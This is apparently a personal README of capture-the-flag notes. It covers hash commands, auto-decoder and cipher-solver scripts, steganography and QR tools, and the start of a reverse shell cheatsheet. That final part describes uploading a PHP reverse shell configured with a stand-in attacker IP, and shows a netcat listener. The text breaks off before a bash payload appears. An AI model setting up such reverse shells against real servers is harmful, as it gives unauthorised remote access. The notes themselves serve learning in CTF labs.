# 🛡️ My CTF Notes

This is my personal CTF learning notes.
Click sections to expand 👇

---

<details>
<summary>🔐 Hashing & Decoder</summary>

## 📌 Hashing

### 🔹 What is Hashing

* One-way function (cannot reverse directly)
* Common types:

  * MD5
  * SHA1
  * SHA256

---

### 🔹 Usage

```bash
md5sum file.txt
sha1sum file.txt
sha256sum file.txt
```

---

### 🔹 Important

* Hashes cannot be decoded
* Only possible by:

  * Brute force
  * Wordlist attack

---

## 📌 decoder.py (Auto Multi-Decoder)

### 🔹 What it does

* Automatically tries:

  * Base16 / Base32 / Base64 / Base58 / Base85
  * Hex
  * ROT13 + Caesar shifts
  * URL / HTML decode
  * Binary / Decimal / Octal ASCII
  * Zlib / Gzip / BZ2 / LZMA (hex)
  * Big Int 

---

### 🔹 Requirement (optional)

```bash
pip install base58
```

---

### 🔹 Run

```bash
python3 decoder.py "SGVsbG8="
```

OR:

```bash
python3 decoder.py "$(cat file.txt)"
```

---

### 🔹 Output Example

```bash
[Base64]
Hello

[Caesar Shift 13]
Uryyb
```

---

### 🔹 Use case

* Detect unknown encoding automatically
* Useful when you don’t know encoding type in CTF

---

### 🔹 Example (Base58)

```bash
python3 decoder.py "3agrSy1CewF9v8ukcSkPSYm3oKUoByUpKG4L"
```

```bash
[Base58]
THM{17_h45_l3553r_l3773r5}
```

---

### 🔹 Notes

* Prints only readable results
* Skips invalid decoders automatically
* Good for quick CTF analysis

</details>

---

<details>
<summary>🖼️ Image Extraction & Steganography</summary>

## 📌 Metadata (EXIF)

### 🔹 Tool: exiftool

### 🔹 Install

```bash
sudo apt install exiftool
```

---

### 🔹 Usage

```bash
exiftool image.jpg
```

---

### 🔹 What to look for

* Comments
* Hidden text
* Strange values

---

## 📌 Steghide

### 🔹 Check hidden data

```bash
steghide info image.jpg
```

---

### 🔹 Extract

```bash
steghide extract -sf image.jpg
```

---

## 📌 Stegseek

### 🔹 Crack password

```bash
stegseek image.jpg /usr/share/wordlists/rockyou.txt
```

---

## 📌 zsteg

### 🔹 Install

```bash
gem install zsteg
```

---

### 🔹 Usage

```bash
zsteg image.png
```

---

## 📌 Basic Commands

```bash
file image.jpg
strings image.jpg | less
exiftool image.jpg
binwalk -e image.jpg
steghide info image.jpg
stegseek image.jpg rockyou.txt
zsteg image.png
```

---

## ⚠️ Tips

* Start with `strings`
* Check metadata first
* JPG ≠ always steghide
* Use multiple tools

---

## 🎯 Goal

* Extract hidden flags from images
* Understand steganography techniques

</details>

---

<details>
<summary>📷 QR Code Decoder</summary>

## 📌 Decode QR from Image

### 🔹 Tool: zbarimg

### 🔹 Install

```bash
sudo apt install zbar-tools
```

---

### 🔹 Usage

```bash
zbarimg image.jpg
```

---

### 🔹 Output Example

```bash
QR-Code:THM{example_flag}
```

👉 Fastest way to decode QR in CTF

---

## 🐍 Python QR Decoder

### 🔹 Requirements

```bash
sudo apt install libzbar0 python3-venv
python3 -m venv myenv
source myenv/bin/activate
pip install opencv-python pyzbar pillow
```

---

### 🔹 Run

```bash
python3 qr_decoder.py image.jpg
```

---

### 🔹 Output

```bash
Type: QRCODE
Data: THM{example_flag}
```

---

## 🧠 Tips

* Try `zbarimg` first (faster)
* If QR not detected:

  * crop image
  * increase contrast
  * rotate image
* Use `binwalk -e image.jpg` if QR is hidden inside

</details>

<details>
<summary>🧠 Brainfuck Decoder (bf.py)</summary>

Simple script to **decode Brainfuck code** and print output.

---

## 📌 What is Brainfuck?

Uses only 8 commands:

```text
> < + - . , [ ]
```

Used in CTF to hide text.

---

## ⚙️ Requirement

```bash
python3 --version
```

---

## 🚀 Usage

### 🔹 Pipe input

```bash
echo 'CODE' | python3 bf.py
```

### 🔹 From file

```bash
python3 bf.py < code.bf
```

---

## 📤 Output

```bash
Hello World!
```

---

## 🎯 Note

* Brainfuck is **code, not encoding**
* It must be **executed to get output**
</details>

<details>
<summary>🧮 Math for ctf</summary>

## 📌 XOR (Exclusive OR)

### 🔹 What is XOR?

* Bitwise operation
* Used a lot in CTF encoding
* Hint words: **exclusive**, **xor**

---

### 🔹 Usage

```bash
python3 xor.py x y
```

---

### 🔹 Output

```bash
THM{********}
```

---

## 🎯 Tips

* Same length strings → try XOR
* Repeating key → use key XOR
* Common in crypto CTF

</details>

<details>
<summary>🖼️ Stegsolve (Install & Usage Guide)</summary>

## 📌 Why we use it

* Detect hidden data inside images
* Analyze color channels (RGB)
* Reveal LSB (bit-level) steganography
* Common in PNG CTF challenges

---

## ⚙️ Installation

```bash
wget http://www.caesum.com/handbook/Stegsolve.jar
```

---

## 🚀 Run

```bash
java -jar Stegsolve.jar
```

---

## 🧪 Usage

* Open image → **File → Open**
* Use **← / → arrow keys** to switch layers
* Look for hidden text / patterns

---

## 🎯 Summary

* Tool for **visual steganography analysis**
* Helps find hidden flags in image layers

</details>

<details>
<summary>🔐 Vigenère Auto Solver (Known Plaintext)</summary>

## 📌 What it does

* Finds the **Vigenère key automatically**
* Decrypts ciphertext using a **known plaintext prefix**
* Useful in CTF when flag format is known (e.g., `TRYHACKME{}`)

---

## ⚙️ Requirements

```bash
python3 --version
```

---

## 🧠 How it works

* Uses known plaintext (e.g., `TRYHACKME`)
* Computes key using:

```text
Key = (Cipher - Plain) mod 26
```

* Then decrypts full ciphertext

---

## 🚀 Usage

```bash
python3 auto_vigenere.py
```

---

### 🔹 Input Example

```text
Enter full ciphertext: MYKAHODTQ{RVG_YVGGK_FAL_WXF}
Enter known plaintext prefix: TRYHACKME
```

---

## 📤 Output

```text
Found key:
TOMYGIMMM

Decrypted text:
TRYHACKME{YOU_FOUND_THE_KEY}
```

---

## 🎯 Use Case

* Vigenère cipher challenges
* Known prefix attacks
* CTF flags with fixed format

---

## ⚠️ Note

* Requires correct known plaintext
* Key may repeat pattern

</details>

# 🔁 Reverse Shell Cheatsheet

---

<details>
<summary>🐚 PHP Reverse Shell</summary>

### 📌 What is it?
A PHP reverse shell lets the target web server connect back to your machine and gives you a shell.

---

### 📌 When to use it
- Target runs PHP
- You can upload `.php` files
- File is accessible via browser

---

### ⚙️ Setup
Edit the shell file:

```php
$ip = 'YOUR_KALI_IP';
$port = 4444;
```
</details>
<details>
<summary>🐚 Bash Reverse Shell (Basic)</summary>

### 📌 What is it?
A reverse shell where the target connects back to your machine using bash.

---

### 🚀 Usage

#### 1. Start listener (your machine)
```bash
nc -lvnp 4444